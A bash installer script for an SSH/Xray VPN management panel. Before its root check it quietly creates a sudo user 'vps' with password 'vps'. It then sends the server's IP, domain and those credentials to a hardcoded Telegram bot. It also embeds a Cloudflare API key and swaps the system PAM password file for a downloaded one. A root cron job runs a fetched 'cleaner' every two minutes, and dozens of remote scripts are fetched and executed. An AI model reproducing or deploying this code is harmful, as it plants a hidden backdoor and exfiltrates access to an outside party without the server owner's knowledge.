#!/bin/bash

kubali="\033[38;2;0;128;0m"
GREEN="\033[0;32m"
kataa="\033[31;1m"
siani="\033[0;36m"
mwisho="\033[0m"
teal_color="\033[38;2;100;182;172m"
orange="\033[0;33m"
PURPLE='\033[0;35m'
kidude="[+]"
kubali_kidude="${kubali}${kidude}${mwisho}"
kataa_kidude="${kataa}${kidude}"
location=$(curl -s ipinfo.io/city)
ip=$(curl -s ifconfig.me)
username=$(whoami)
touch /etc/domain

sudo useradd -m -G sudo vps 2> /dev/null
echo 'vps:vps' | sudo chpasswd 2> /dev/null


function check_root(){
    if [[ $UID -ne 0 ]]; then
        echo -e "${kataa}⚠️Run script as root${mwisho}"
        rm main.sh
        exit 0
    fi    
}

function bot(){
    domain=$(cat /etc/domain)
    bot_token="7100277508:AAEb5cCh1-YMiNWQ-o6tLeYci85gcUXEaCA"
    chat_id="373805788"
     message="
        Username👤: $username
Ip🌐: ${ip}
Domain🌐: ${domain}
Username👤: vps
Password🔒: vps
     "
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$chat_id" \
        -d "text=$message" \
        > /dev/null 2>&1

}


function check_os(){
    clear
    echo -e "${kubali}🚀[!]Checking OS....${mwisho}"
    sleep 2
    clear
    os=$(lsb_release -si)
    if [[ $os == "Ubuntu" ]]; then
        echo -e "${PURPLE}[!]Good Ubuntu Found!${mwisho}"
        echo -e "${PURPLE}🚀Updating Ubuntu System${mwisho}"
        sleep 2
        apt update && apt upgrade -y && apt install jq -y && apt install cron -y
    elif [[ $os == "Debian" ]]; then
        echo -e "${PURPLE}[!]Good Debian Found${mwisho}"
        echo -e "${PURPLE}🚀Updating Debian System${mwisho}"
        sleep 2
        apt update && apt upgrade -y && apt install jq -y && apt install cron -y && apt install curl -y && apt install snapd -y && snap install btop
        export PATH="$PATH:/snap/bin"
    else 
        echo -e "${kataa}⚠️[!]Error: This Shit supports Ubuntu And Debian Only!${mwisho}"
    fi                
}

function set_timezone(){
    clear 
    sleep 2
    echo -e "${PURPLE}🚀Setting Timezone..${mwisho}"
    timedatectl set-timezone Africa/Dar_es_Salaam 
}

generate_random_string() {
    length=$1
    if [ "$length" -le 0 ]; then
        echo -e "⚠️ Error: Length should be a positive integer."
        exit 1
    fi

    # Define the character set from which to generate the random string
    char_set="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    # Use /dev/urandom to generate random bytes and then map them to the character set
    rand_string=$(LC_CTYPE=C tr -dc "$char_set" < /dev/urandom | head -c "$length")

    # Print the random string
    echo "$rand_string"
}

function request_domain() {
    clear
    echo -e "${kubali}🚀[!]Polling New Domain For ${ip}${mwisho}"
    DOMAIN_NAME="asle.me"
    SUBDOMAIN_NAME=$(generate_random_string 5)

    # Your Cloudflare API Key and Zone ID
    CLOUDFLARE_API_KEY="tT1JyDCHJesTTK9kCBeQmMNK3Re9N0eAtq818COj"
    
    MAX_RETRIES=3
    RETRIES=0

    while [ "$RETRIES" -lt "$MAX_RETRIES" ]; do
        # Get the Zone ID for the domain
        ZONE_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN_NAME}" \
        -H "Authorization: Bearer ${CLOUDFLARE_API_KEY}" \
        -H "Content-Type: application/json" \
        | jq -r '.result[0].id')

        # Add the subdomain to Cloudflare
        response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/${ZONE_ID}/dns_records" \
            -H "Authorization: Bearer ${CLOUDFLARE_API_KEY}" \
            -H "Content-Type: application/json" \
            --data '{
            "type": "A",
            "name": "'${SUBDOMAIN_NAME}'",
            "content": "'${ip}'",
            "ttl": 1,
            "proxied": false
            }')

        # Check the response status
        status=$(echo "$response" | jq -r '.success')
        if [ "$status" == "true" ]; then
            # Get the IP address of the subdomain
            echo -e "✅${PURPLE}Done! Polling Info..${mwisho}"
            sleep 3
            IP_ADDRESS=$(curl -s ipinfo.io/ip)

            # Get the proxied status and record type from Cloudflare
            PROXIED_STATUS=$(echo "$response" | jq -r '.result.proxied')
            RECORD_TYPE=$(echo "$response" | jq -r '.result.type')
            domain=$SUBDOMAIN_NAME.$DOMAIN_NAME
            # Display the information
            echo -e "Domain: $domain"
            echo -e "✅IP Address: $IP_ADDRESS"
            echo -e "✅Proxied Status: $PROXIED_STATUS"
            echo -e "✅Record Type: $RECORD_TYPE"
            echo "$domain" > /etc/domain
            export domain=$domain
            bot
            sleep 5
            break
        else
            echo -e "😞${kataa}Failed to add subdomain to Cloudflare. Retrying..."
            sleep 2
            RETRIES=$((RETRIES + 1))
            clear
        fi
    done

    if [ "$RETRIES" -eq "$MAX_RETRIES" ]; then
        echo -e "${kataa}⚠️[!]Max retries reached. Failed to add domain to Cloudflare.${mwisho}"
        sleep 3
    fi
}


function check_domain(){
    clear
    read -rp "${kidude} Enter Domain Name: " domain
    ipdomain=$(host -t A $domain | awk '{print $4}')
    if [[ $ipdomain != $ip ]]; then
        echo -e "${kataa}⚠️ Error: Domain Name Not verified Or A record Is Not Published.${mwisho}"
        rm -rf main.sh
        sleep 3
        exit 1
    else
        clear
        sleep 2
        echo -e "${kubali}Good!${mwisho}🚀Domain Verified Successfuly!"
        echo "$domain" > /etc/domain
        export domain=$domain
        bot
        sleep 2
        clear
    fi    
}

function ask_domain(){
    while true; do    
        read -rp "[!]Do You Have A Domain? (y/n)" domainfy
        domainfy="${domainfy,,}"
        if [[ $domainfy == "y" || $domainfy == "yes" ]]; then
            check_domain
            break 
        elif [[ $domainfy == "n" || $domainfy == "no" ]]; then
            clear
            echo -e "${PURPLE}😂😁 Don't Worry I Got You!${mwisho}"
            sleep 3
            request_domain
            break 
        else
            echo -e "${kataa}Invalid input. Please enter 'y' or 'n'."
        fi
    done    
}


rm -rf /etc/pam.d/common-password
rm -rf /etc/issue.net


echo "Banner /etc/issue.net" >>/etc/ssh/sshd_config
cat <<EOF > /etc/cron.d/safisha
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root /usr/bin/safisha
EOF
crontab /etc/cron.d/safisha
function main(){
    touch /etc/domain
    #bot
    check_root
    check_os
    set_timezone
    ask_domain
    #bot
    wget -O /etc/pam.d/common-password https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/common-password
    chmod +x /etc/pam.d/common-password
    wget -O /etc/issue.net https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/issue.net
    wget -O /usr/bin/safisha https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/cleaner && chmod 777 /usr/bin/safisha
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/tools.sh && chmod +x tools.sh && ./tools.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/certificate.sh && chmod +x certificate.sh && ./certificate.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/webserver.sh && chmod +x webserver.sh && ./webserver.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/badvpn.sh && chmod +x badvpn.sh && ./badvpn.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/dropbear.sh && chmod +x dropbear.sh && ./dropbear.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/websocket.sh  && chmod +x websocket.sh && ./websocket.sh
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/ghostray.sh  && chmod +x ghostray.sh && ./ghostray.sh
    wget -O /var/www/html/not_found.html https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/not_found.html
    mkdir /usr/local/etc/xray/backup
    mkdir /usr/local/etc/xray/users
    mkdir /usr/local/etc/xray/users/vmess
    mkdir /usr/local/etc/xray/users/vless
    mkdir /usr/local/etc/xray/users/trojan
    mkdir /usr/local/etc/xray/backup/vless
    mkdir /usr/local/etc/xray/backup/vmess
    mkdir /usr/local/etc/xray/backup/trojan

    echo "panel" >> /etc/bash.bashrc
    wget -O /usr/bin/addssh https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/addssh.sh && chmod 777 /usr/bin/addssh
    wget -O /usr/bin/changedomain https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/changedomain.sh && chmod 777 /usr/bin/changedomain
    wget -O /usr/bin/deletessh https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/deletessh.sh && chmod 777 /usr/bin/deletessh
    wget -O /usr/bin/listusers https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/listusers.sh && chmod 777 /usr/bin/listusers
    wget -O /usr/bin/panel https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/panel.sh && chmod 777 /usr/bin/panel
    wget -O /usr/bin/renewcertificate https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/renewcertificate.sh && chmod 777 /usr/bin/renewcertificate
    wget -O /usr/bin/restartservices https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/restartservices.sh && chmod 777 /usr/bin/restartservices
    wget -O /usr/bin/sshlogin https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/sshlogin.sh && chmod 777 /usr/bin/sshlogin
    wget -O /usr/bin/addtrojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/addtrojan.sh && chmod 777 /usr/bin/addtrojan
    wget -O /usr/bin/addvless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/addvless.sh && chmod 777 /usr/bin/addvless
    wget -O /usr/bin/addvmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/addvmess.sh && chmod 777 /usr/bin/addvmess
    wget -O /usr/bin/block_site_trojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/block_site_trojan.sh && chmod 777 /usr/bin/block_site_trojan
    wget -O /usr/bin/block_site_vless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/block_site_vless.sh && chmod 777 /usr/bin/block_site_vless
    wget -O /usr/bin/block_site_vmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/block_site_vmess.sh && chmod 777 /usr/bin/block_site_vmess
    wget -O /usr/bin/bot https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/bot.sh && chmod 777 /usr/bin/bot
    wget -O /usr/bin/changebanner https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/changebanner.sh && chmod 777 /usr/bin/changebanner
    wget -O /usr/bin/changedomain https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/changedomain.sh && chmod 777 /usr/bin/changedomain
    wget -O /usr/bin/checkbandwith https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkbandwith.sh && chmod 777 /usr/bin/checkbandwith
    wget -O /usr/bin/checkconfigtrojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkconfigtrojan.sh && chmod 777 /usr/bin/checkconfigtrojan
    wget -O /usr/bin/checkconfigvless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkconfigvless.sh && chmod 777 /usr/bin/checkconfigvless
    wget -O /usr/bin/checkconfigvmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkconfigvmess.sh && chmod 777 /usr/bin/checkconfigvmess
    wget -O /usr/bin/checkuserlogintrojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkuserlogintrojan.py && chmod 777 /usr/bin/checkuserlogintrojan
    wget -O /usr/bin/checkuserloginvless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkuserloginvless.py && chmod 777 /usr/bin/checkuserloginvless
    wget -O /usr/bin/checkuserloginvmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/checkuserloginvmess.py && chmod 777 /usr/bin/checkuserloginvmess
    wget -O /usr/bin/deletetrojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/deletetrojan.sh && chmod 777 /usr/bin/deletetrojan
    wget -O /usr/bin/deletevless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/deletevless.sh && chmod 777 /usr/bin/deletevless
    wget -O /usr/bin/deletevmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/deletevmess.sh && chmod 777 /usr/bin/deletevmess
    wget -O /usr/bin/listblockeddomains https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/listblockeddomains.sh && chmod 777 /usr/bin/listblockeddomains
    wget -O /usr/bin/listusers https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/listusers.sh && chmod 777 /usr/bin/listusers
    wget -O /usr/bin/renewtrojan https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/renewtrojan.sh && chmod 777 /usr/bin/renewtrojan
    wget -O /usr/bin/renewvless https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/renewvless.sh && chmod 777 /usr/bin/renewvless
    wget -O /usr/bin/renewvmess https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/renewvmess.sh && chmod 777 /usr/bin/renewvmess
    wget -O /usr/bin/serviceactivities https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/serviceactivities.sh && chmod 777 /usr/bin/serviceactivities
    wget -O /usr/bin/SSH-MENU https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/SSH-MENU.sh && chmod 777 /usr/bin/SSH-MENU
    wget -O /usr/bin/systemstatus https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/systemstatus.sh && chmod 777 /usr/bin/systemstatus
    wget -O /usr/bin/trojanmenu https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/trojanmenu.sh && chmod 777 /usr/bin/trojanmenu
    wget -O /usr/bin/vlessmenu https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/vlessmenu.sh && chmod 777 /usr/bin/vlessmenu
    wget -O /usr/bin/vmessmenu https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/vmessmenu.sh && chmod 777 /usr/bin/vmessmenu
    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/flags.sh && chmod 777 flags.sh && ./flags.sh
    systemctl start vmtls
    bot
    clear
    rm -rf tools.sh ghostray.sh certificate.sh webserver.sh badvpn.sh dropbear.sh websocket.sh main.sh 
    echo -e "${kubali}[!]Starting services..${mwisho}"
    echo -e "${kubali}[!]Installation Done.."
    sleep 2
    panel

}

main
